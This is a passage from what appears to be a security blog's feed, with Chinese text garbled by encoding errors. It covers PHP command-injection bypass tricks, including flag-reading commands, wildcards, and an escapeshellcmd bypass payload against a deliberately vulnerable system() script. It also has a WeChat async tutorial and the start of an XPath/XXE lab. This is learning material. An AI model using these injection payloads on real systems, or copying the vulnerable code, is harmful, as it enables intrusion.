‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">rev</span> /flag   <span class="token comment"># å°†æ–‡ä»¶å†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡º</span><span class="token punctuation">&#125;</span>e32de3e34-g45t4d2-45gt532-34f32e3<span class="token punctuation">&#123;</span>galflinux@Extrader:/var/www/html$ <span class="token function">more</span> /flag  <span class="token comment"># æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ¯æ¬¡æ˜¾ç¤ºä¸€å±</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tail</span> /flag  <span class="token comment"># åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾è‹¥å¹²è¡Œ</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">less</span> /flag  <span class="token comment"># åˆ†å±ä¸Šä¸‹ç¿»é¡µæµè§ˆæ–‡ä»¶å†…å®¹</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">head</span> /flag  <span class="token comment"># åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å¼€å¤´è‹¥å¹²è¡Œ</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tac</span> /flag   <span class="token comment"># å°†æ–‡ä»¶ä»¥è¡Œä¸ºå•ä½çš„ååºè¾“å‡º</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">sort</span> /flag  <span class="token comment"># å°†æ–‡ä»¶è¿›è¡Œæ’åºå¹¶è¾“å‡º</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">nl</span> /flag    <span class="token comment"># åœ¨Linuxç³»ç»Ÿä¸­è®¡ç®—æ–‡ä»¶å†…å®¹è¡Œå·</span>     <span class="token number">1</span>  flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ hexdump /flag  <span class="token comment">#æ˜¾ç¤ºæ–‡ä»¶åå…­è¿›åˆ¶æ ¼å¼</span>0000000 6c66 <span class="token number">6761</span> 337b <span class="token number">3265</span> <span class="token number">6633</span> <span class="token number">3334</span> 322d <span class="token number">3533</span>0000010 <span class="token number">6774</span> <span class="token number">3435</span> 322d <span class="token number">3464</span> <span class="token number">3574</span> <span class="token number">6734</span> 342d <span class="token number">6533</span>0000020 <span class="token number">6533</span> <span class="token number">3264</span> <span class="token number">6533</span> 0a7d0000028linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fl*flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fla?flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="ç»•è¿‡escapeshellcmd"><a href="#ç»•è¿‡escapeshellcmd" class="headerlink" title="ç»•è¿‡escapeshellcmd"></a><strong>ç»•è¿‡escapeshellcmd</strong></h2><p>æµ‹è¯•ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dir '</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$escaped_command</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">,</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ‰§è¡Œ<code>.bat</code>æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ©ç”¨<code>%1a</code>ï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ã€‚</p><p>payload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">dir</span><span class="token operator">=</span>. %1a <span class="token function">whoami</span></code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><strong>å‚è€ƒ</strong></h2><ul><li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">æ¥è‡ªå°å¯†åœˆé‡Œçš„é‚£äº›å¥‡æŠ€æ·«å·§</a></li><li><a href="https://www.mi1k7ea.com/2019/06/30/å‘½ä»¤æ³¨å…¥BypassæŠ€å·§å°ç»“/">å‘½ä»¤æ³¨å…¥BypassæŠ€å·§å°ç»“</a></li><li><a href="https://www.freebuf.com/articles/web/154453.html">æŒ–æ´ç»éªŒ|å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶</a></li><li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-GxNoCndt&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;115162&quot; data-server=&quot;netease&quot; data-type=&quot;song&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="https://www.extrader.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>å¾®ä¿¡å°ç¨‹åºæœ‰å…³å¼‚æ­¥é—®é¢˜çš„ä¸€äº›æ“ä½œ</title>
    <link href="https://www.extrader.top/posts/80b70afe/"/>
    <id>https://www.extrader.top/posts/80b70afe/</id>
    <published>2020-08-13T12:55:31.000Z</published>
    <updated>2020-08-14T08:04:36.698Z</updated>
    
    <content type="html"><![CDATA[<p>æ–¹æ³•ä¸å”¯ä¸€ï¼Œåç»­æœ‰æ–°æ–¹æ³•å†è¡¥ä¸Š~</p><span id="more"></span><h3 id="Promise-å¯¹è±¡"><a href="#Promise-å¯¹è±¡" class="headerlink" title="Promise å¯¹è±¡"></a>Promise å¯¹è±¡</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* å¼‚æ­¥æ“ä½œæˆåŠŸ */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å…³äº<code>promise</code>  å…·ä½“å¯å‚è€ƒé˜®è€å¸ˆçš„<a href="https://es6.ruanyifeng.com/#docs/promise">Promise å¯¹è±¡</a></p><p>æˆ–è€…ç›´æ¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°"><a href="#åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°" class="headerlink" title="åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°"></a>åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.jsä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> æ–¹æ³•ç”¨äºå°†æ‰€æœ‰å¯æšä¸¾å±æ€§çš„å€¼ä»ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ã€‚å®ƒå°†è¿”å›ç›®æ ‡å¯¹è±¡ã€‚</p><h3 id="wx-requestè¯·æ±‚å°è£…"><a href="#wx-requestè¯·æ±‚å°è£…" class="headerlink" title="wx.requestè¯·æ±‚å°è£…"></a>wx.requestè¯·æ±‚å°è£…</h3><h4 id="å¼‚æ­¥"><a href="#å¼‚æ­¥" class="headerlink" title="å¼‚æ­¥"></a>å¼‚æ­¥</h4><p><code>api/index.js</code>å°è£…</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>å¼•å…¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>ä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="åŒæ­¥"><a href="#åŒæ­¥" class="headerlink" title="åŒæ­¥"></a>åŒæ­¥</h4><p><code>app.js</code>å¼•å…¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>ä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise å¯¹è±¡</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">å¾®ä¿¡å°ç¨‹åºå°è£…å¼‚æ­¥è¯·æ±‚</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">å°†å°ç¨‹åºåŸç”Ÿå¼‚æ­¥å‡½æ•°promisifyåï¼Œåœ¨async/awaitä¸­ä½¿ç”¨</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">å¾®ä¿¡å°ç¨‹åºä¸­ä½¿ç”¨Async/Awaitæ–¹æ³•å¼‚æ­¥è¯·æ±‚å˜ä¸ºåŒæ­¥è¯·æ±‚</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ–¹æ³•ä¸å”¯ä¸€ï¼Œåç»­æœ‰æ–°æ–¹æ³•å†è¡¥ä¸Š~&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¼€å‘" scheme="https://www.extrader.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XXEå­¦ä¹ ç¬”è®°</title>
    <link href="https://www.extrader.top/posts/55c267c8/"/>
    <id>https://www.extrader.top/posts/55c267c8/</id>
    <published>2020-08-11T02:06:34.000Z</published>
    <updated>2020-08-18T02:56:23.372Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-oRnOkvXS" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h3 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h3><p>XPathæ³¨å…¥å¯¹è±¡æ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶</p><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code 